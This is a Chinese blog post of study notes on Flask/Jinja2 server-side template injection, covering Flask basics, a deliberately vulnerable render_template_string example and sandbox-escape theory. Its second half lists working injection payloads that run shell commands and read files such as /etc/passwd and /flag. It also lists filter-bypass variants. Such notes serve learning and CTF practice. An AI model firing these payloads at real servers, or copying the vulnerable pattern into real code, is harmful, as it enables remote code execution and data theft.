@@ -1,0 +1,345 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>一些关于SSTI模板注入的笔记(flask) - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="关于Flask的前置知识flask是什么​      Flask诞生于2010年，用python语言基于werkzeug工具箱编写的轻量级web开发框架。flask使用jinja2作为渲染引擎，在网,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">一些关于SSTI模板注入的笔记(flask)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">一些关于SSTI模板注入的笔记(flask)</h1>
+        <div class="stuff">
+            <span>八月 28, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="关于Flask的前置知识"><a href="#关于Flask的前置知识" class="headerlink" title="关于Flask的前置知识"></a>关于Flask的前置知识</h3><h4 id="flask是什么"><a href="#flask是什么" class="headerlink" title="flask是什么"></a>flask是什么</h4><p>​      Flask诞生于2010年，用python语言基于werkzeug工具箱编写的轻量级web开发框架。flask使用jinja2作为渲染引擎，在网站的根目录下templates文件夹用来存放html文件（模板文件）。</p>
+<p>模板引擎：即引擎中具有一套生成html的程序,只需获取用户的数据,然后放在渲染函数中即可生成一个前端的html页面。</p>
+<h4 id="Flask请求参数"><a href="#Flask请求参数" class="headerlink" title="Flask请求参数"></a>Flask请求参数</h4><h5 id="url传递参数"><a href="#url传递参数" class="headerlink" title="url传递参数"></a>url传递参数</h5><p><strong>转换器&lt;&gt; 默认为字符串，加上int转化数据类型</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users/&lt;int:user_id&gt;&#x27;</span></span>)    </span><span class="comment">#指明路径和限制数据类型  127..0.0.1:5000/users/123</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(user_id))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello user &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(user_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>这是一个简单的利用url处传参的flask的代码，运行后在页面访问127.0.0.1:5000默认端口加上代码中指定的路径和数据：</p>
+<p><img src="1.png"></p>
+<h5 id="request全局变量"><a href="#request全局变量" class="headerlink" title="request全局变量"></a>request全局变量</h5><p><strong>使用request对象的args属性调用get方法获取参数值。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/articles/&#x27;</span></span>)     </span><span class="comment">#http://127.0.0.1:5000/articles/?id=1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_articles</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;articles id &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此时指定代码运行访问的路径为/articles，通过request的args属性调用get方法获取id的参数值：</p>
+<p><img src="2.png"></p>
+<h3 id="Flask模块响应"><a href="#Flask模块响应" class="headerlink" title="Flask模块响应"></a>Flask模块响应</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><table>
+<thead>
+<tr>
+<th align="center">渲染函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">render_template</td>
+<td align="center">渲染指定文件内容</td>
+</tr>
+<tr>
+<td align="center">render_template_string</td>
+<td align="center">渲染一个字符串</td>
+</tr>
+</tbody></table>
+<h4 id="使用render-template渲染模板并返回给浏览器"><a href="#使用render-template渲染模板并返回给浏览器" class="headerlink" title="使用render_template渲染模板并返回给浏览器"></a>使用render_template渲染模板并返回给浏览器</h4><ol>
+<li>创建一个模板index.html（放在新建文件夹templates下，这是Jinja2渲染的默认路径）</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     我的模板HTML内容</span><br><span class="line">     <span class="tag">&lt;<span class="name">br</span>&gt;</span>&#123;&#123;my_str&#125;&#125;</span><br><span class="line">     <span class="tag">&lt;<span class="name">br</span>&gt;</span>&#123;&#123;my_int&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li>后端视图代码</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    mint = <span class="number">123</span></span><br><span class="line">    mstr = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,my_int=mint,my_str=mstr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行访问页面：</p>
+<p><img src="3.png"></p>
+<p>以上模板是安全的，因为没有用户可以控制的输入参数。如果满足参数可控，没有过滤，则可能存在ssti模板注入漏洞。</p>
+<h4 id="具有提交参数的模块响应"><a href="#具有提交参数的模块响应" class="headerlink" title="具有提交参数的模块响应"></a>具有提交参数的模块响应</h4><ol>
+<li>创建index.html</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     &#123;&#123;key&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>后端d代码</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,key=key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="4.png"></p>
+<p>发现当我们尝试输入一个变量让代码进行执行时，页面并没有返回1-1的结果，而是将我们输入的内容原样进行输出了。</p>
+<p><strong>这是因为render_template函数自动渲染对应的内容（index.html），不会再执行渲染。但是其他的渲染函数就可能存在再次渲染的问题：render_template_string。</strong></p>
+<h4 id="使用render-template-string渲染模板（ssti注入的原理）"><a href="#使用render-template-string渲染模板（ssti注入的原理）" class="headerlink" title="使用render_template_string渲染模板（ssti注入的原理）"></a>使用render_template_string渲染模板（ssti注入的原理）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string   <span class="comment">#导致模板注入的函数render_template_string</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    tempaltes = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Title&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;&#123;&#125;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;key&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tempaltes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接在python文件中对用户提交的数据使用tempaltes进行存放，对tempaltes中提交的数据进行render_template_string渲染，因此会造成ssti漏洞。</p>
+<p><img src="5.png"></p>
+<p>我们发现0被执行了，返回计算结果0。</p>
+<p>这是因为在flask中，渲染引擎(<code>Jinja2</code>)会将<code>&#123;&#123; --- &#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行。</p>
+<h3 id="ssti模板注入的绕过"><a href="#ssti模板注入的绕过" class="headerlink" title="ssti模板注入的绕过"></a>ssti模板注入的绕过</h3><h4 id="ssti模板注入原理"><a href="#ssti模板注入原理" class="headerlink" title="ssti模板注入原理"></a>ssti模板注入原理</h4><p>​      服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p>
+<h4 id="jinja2语法"><a href="#jinja2语法" class="headerlink" title="jinja2语法"></a>jinja2语法</h4><p>对于官方文档的有如下解释：</p>
+<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/">https://jinja.palletsprojects.com/en/3.0.x/templates/</a></p>
+<ul>
+<li><code>&#123;% ... %&#125;</code>可以用来声明变量，当然也可以用于循环语句和条件语句。</li>
+<li><code>&#123;&#123; ... &#125;&#125;</code>用于<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#expressions">表达式</a>打印到模板输出，执行双花括号中的内容。</li>
+<li><code>&#123;# ... #&#125;</code>对于未包含在模板输出中的[注释]</li>
+</ul>
+<h4 id="python中的基本类（沙盒逃逸的魔术方法）"><a href="#python中的基本类（沙盒逃逸的魔术方法）" class="headerlink" title="python中的基本类（沙盒逃逸的魔术方法）"></a>python中的基本类（沙盒逃逸的魔术方法）</h4><ul>
+<li>在python中，object类是所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回调用的参数类型</span><br><span class="line"></span><br><span class="line">// 寻找基类的办法</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。（解析顺序）</span><br><span class="line">__base__   返回该对象所继承的基类，一般为object</span><br><span class="line">__bases__   返回类型列表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 找到object后 执行函数的方法</span><br><span class="line">__subclasses__   返回object的子类列表的所有子类</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>基类的使用：</li>
+</ul>
+<p><img src="6.png"></p>
+<ul>
+<li>执行命令的子类：os._wrap_close</li>
+</ul>
+<p>获取os._wrap_close在object类中的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>([].__class__.__base__.__subclasses__().index(os._wrap_close))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过fuzz检测：爆破对应位置的数字</p>
+<p><img src="7.png"></p>
+<ul>
+<li>沙盒逃逸的原理 </li>
+</ul>
+<p><img src="8.png"></p>
+<h4 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h4><p><img src="9.png"></p>
+<h4 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">读取文件/执行命令：</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;flag.txt&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#读写文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h4 id="绕过payload"><a href="#绕过payload" class="headerlink" title="绕过payload"></a>绕过payload</h4><h5 id="过滤方括号"><a href="#过滤方括号" class="headerlink" title="过滤方括号"></a><strong>过滤方括号</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用__getitem__绕过：</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)&lt;-&gt; 等价于<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;</span>)&#125;&#125;  </span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;</span>)&#125;&#125;（不能直接进入python环境下用，可能是python程序运行的时候会自己加载什么东西。） </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="过滤引号（单引号-双引号）"><a href="#过滤引号（单引号-双引号）" class="headerlink" title="过滤引号（单引号 双引号）"></a><strong>过滤引号（单引号 双引号）</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用get post 或cookies方式提交：</span><br><span class="line">request.args.参数    requests.values.参数   reuqest.cookies.参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;x.__init__.__globals__[request.args.x1].<span class="built_in">eval</span>(request.args.x2)&#125;&#125;&amp;x1=__builtins__&amp;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line">x可以使用原来的().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>]，也可以使用任意字母。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用<span class="built_in">chr</span>：</span><br><span class="line">&#123;&#123;x.__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;&#123;x.__init__.__globals__.__builtins__. <span class="built_in">eval</span>( <span class="built_in">chr</span>(<span class="number">95</span>) %2b <span class="built_in">chr</span>(<span class="number">95</span>) %2b <span class="built_in">chr</span>(<span class="number">105</span>) %2b <span class="built_in">chr</span>(<span class="number">109</span>) %2b <span class="built_in">chr</span>(<span class="number">112</span>) %2b <span class="built_in">chr</span>(<span class="number">111</span>) %2b <span class="built_in">chr</span>(<span class="number">114</span>) %2b <span class="built_in">chr</span>(<span class="number">116</span>) %2b <span class="built_in">chr</span>(<span class="number">95</span>) %2b <span class="built_in">chr</span>(<span class="number">95</span>) %2b <span class="built_in">chr</span>(<span class="number">40</span>) %2b <span class="built_in">chr</span>(<span class="number">39</span>) %2b <span class="built_in">chr</span>(<span class="number">111</span>) %2b <span class="built_in">chr</span>(<span class="number">115</span>) %2b <span class="built_in">chr</span>(<span class="number">39</span>) %2b <span class="built_in">chr</span>(<span class="number">41</span>) %2b <span class="built_in">chr</span>(<span class="number">46</span>) %2b <span class="built_in">chr</span>(<span class="number">112</span>) %2b <span class="built_in">chr</span>(<span class="number">111</span>) %2b <span class="built_in">chr</span>(<span class="number">112</span>) %2b <span class="built_in">chr</span>(<span class="number">101</span>) %2b <span class="built_in">chr</span>(<span class="number">110</span>) %2b <span class="built_in">chr</span>(<span class="number">40</span>) %2b <span class="built_in">chr</span>(<span class="number">39</span>) %2b <span class="built_in">chr</span>(<span class="number">108</span>) %2b <span class="built_in">chr</span>(<span class="number">115</span>) %2b <span class="built_in">chr</span>(<span class="number">39</span>) %2b <span class="built_in">chr</span>(<span class="number">41</span>) %2b <span class="built_in">chr</span>(<span class="number">46</span>) %2b <span class="built_in">chr</span>(<span class="number">114</span>) %2b <span class="built_in">chr</span>(<span class="number">101</span>) %2b <span class="built_in">chr</span>(<span class="number">97</span>) %2b <span class="built_in">chr</span>(<span class="number">100</span>) %2b <span class="built_in">chr</span>(<span class="number">40</span>) %2b <span class="built_in">chr</span>(<span class="number">41</span>))&#125;&#125;</span><br><span class="line">[<span class="string">&#x27;eval&#x27;</span>]这里可以直接用.<span class="built_in">eval</span>()代替，<span class="built_in">eval</span>里面的执行的语句，把它全部变为<span class="built_in">chr</span>()+<span class="built_in">chr</span>()的形式，最后不要忘记给+编码为%2b</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a><strong>过滤双下划线</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用request传值  </span></span><br><span class="line"></span><br><span class="line">&#123;&#123;()[request.args.<span class="keyword">class</span>].__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;&amp;<span class="class"><span class="keyword">class</span>=<span class="title">__class__</span>  </span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="绕过双花括号"><a href="#绕过双花括号" class="headerlink" title="绕过双花括号"></a><strong>绕过双花括号</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用&#123;% %&#125;</span></span><br><span class="line">&#123;% <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;&#x27;</span>))  %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#方法:&#123;% if ... %&#125;1&#123;% endif %&#125;</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;&#x27;</span>) %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="绕过点（过滤器）"><a href="#绕过点（过滤器）" class="headerlink" title="绕过点（过滤器）"></a><strong>绕过点（过滤器）</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#若.也被过滤，使用原生jinja2函数|attr()</span></span><br><span class="line">request.__class__</span><br><span class="line">request|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
